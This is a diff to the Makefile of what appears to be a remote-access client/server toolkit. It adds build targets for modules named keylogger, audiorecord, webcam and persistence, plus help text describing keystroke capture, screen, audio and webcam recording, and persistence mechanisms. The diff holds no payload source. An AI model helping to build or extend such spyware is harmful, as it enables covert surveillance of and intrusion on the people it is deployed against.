@@ -37,10 +37,16 @@ SRC_DIR = src
 INC_DIR = include
 BIN_DIR = bin
 DOCS_DIR = docs
+MODULES_DIR = modules
+BUILD_DIR = build
 
 # Target executables
 CLIENT_TARGET = $(BIN_DIR)/client$(EXE_EXT)
 SERVER_TARGET = $(BIN_DIR)/server$(EXE_EXT)
+
+# Module targets
+MODULES = keylogger audiorecord webcam persistence
+MODULE_TARGETS = $(addprefix $(BUILD_DIR)/, $(MODULES))
 
 # Source files
 CLIENT_SRC = $(SRC_DIR)/client.c $(SRC_DIR)/persistence.c $(SRC_DIR)/crypto.c
@@ -53,12 +59,23 @@ SERVER_OBJ = $(SERVER_SRC:.c=.o)
 # Default target
 all: $(BIN_DIR) $(CLIENT_TARGET) $(SERVER_TARGET)
 
+# Build all modules
+modules: $(BUILD_DIR) $(MODULE_TARGETS)
+
 # Create bin directory
 $(BIN_DIR):
 ifeq ($(DETECTED_OS),Windows)
 	if not exist $(BIN_DIR) $(MKDIR) $(BIN_DIR)
 else
 	$(MKDIR) $(BIN_DIR)
+endif
+
+# Create build directory for modules
+$(BUILD_DIR):
+ifeq ($(DETECTED_OS),Windows)
+	if not exist $(BUILD_DIR) $(MKDIR) $(BUILD_DIR)
+else
+	$(MKDIR) $(BUILD_DIR)
 endif
 
 # Client executable
@@ -73,14 +90,23 @@ $(SERVER_TARGET): $(SERVER_OBJ) | $(BIN_DIR)
 $(SRC_DIR)/%.o: $(SRC_DIR)/%.c
 	$(CC) $(CFLAGS) -c $< -o $@
 
+# Build individual modules (statically linked for portability)
+$(BUILD_DIR)/%: $(MODULES_DIR)/%.c | $(BUILD_DIR)
+ifeq ($(DETECTED_OS),Windows)
+	$(CC) $(CFLAGS) -static $< -o $@$(EXE_EXT)
+else
+	$(CC) $(CFLAGS) -static $< -o $@
+endif
+
 # Clean build files
 clean:
 ifeq ($(DETECTED_OS),Windows)
 	if exist $(SRC_DIR)\\*.o $(RM) $(SRC_DIR)\\*.o
 	if exist $(BIN_DIR) rmdir /S /Q $(BIN_DIR)
+	if exist $(BUILD_DIR) rmdir /S /Q $(BUILD_DIR)
 else
 	$(RM) $(SRC_DIR)/*.o
-	rm -rf $(BIN_DIR)
+	rm -rf $(BIN_DIR) $(BUILD_DIR)
 endif
 
 # Install targets (copies to common locations)
@@ -109,13 +135,13 @@ windows: CC=x86_64-w64-mingw32-gcc
 windows: CFLAGS=$(BASE_CFLAGS) -D_WIN32_WINNT=0x0600
 windows: LDFLAGS=-lws2_32 -ladvapi32 -lshell32 -lssl -lcrypto
 windows: EXE_EXT=.exe
-windows: $(BIN_DIR) $(CLIENT_TARGET) $(SERVER_TARGET)
+windows: $(BIN_DIR) $(BUILD_DIR) $(CLIENT_TARGET) $(SERVER_TARGET) $(MODULE_TARGETS)
 
 linux: CC=gcc
 linux: CFLAGS=$(BASE_CFLAGS) -D_GNU_SOURCE -D_POSIX_C_SOURCE=200809L
 linux: LDFLAGS=-lssl -lcrypto
 linux: EXE_EXT=
-linux: $(BIN_DIR) $(CLIENT_TARGET) $(SERVER_TARGET)
+linux: $(BIN_DIR) $(BUILD_DIR) $(CLIENT_TARGET) $(SERVER_TARGET) $(MODULE_TARGETS)
 
 # Create source distribution
 dist: clean
@@ -143,6 +169,7 @@ structure:
 help:
 	@echo "Available targets:"
 	@echo "  all            - Build both client and server (default)"
+	@echo "  modules        - Build all standalone modules"
 	@echo "  client         - Build only the client"
 	@echo "  server         - Build only the server"
 	@echo "  clean          - Remove all build files"
@@ -158,9 +185,17 @@ help:
 	@echo "  structure      - Show project directory structure"
 	@echo "  help           - Show this help message"
 	@echo ""
+	@echo "Available modules:"
+	@echo "  keylogger      - Captures keyboard input"
+	@echo "  ram-hog        - Memory consumption tool"
+	@echo "  audiorecord    - Audio recording via OSS/ALSA"
+	@echo "  videorecord    - Screen recording"
+	@echo "  webcam         - Webcam capture via V4L2"
+	@echo "  persistence    - Persistence mechanisms"
+	@echo ""
 	@echo "Cross-platform notes:"
 	@echo "  On Windows: Use 'mingw32-make' instead of 'make'"
 	@echo "  For Windows cross-compilation: Install mingw-w64-gcc"
 	@echo "  Detected OS: $(DETECTED_OS)"
 
-.PHONY: all clean install-client install-server test-compile debug release windows linux dist package structure help
+.PHONY: all modules clean install-client install-server test-compile debug release windows linux dist package structure help
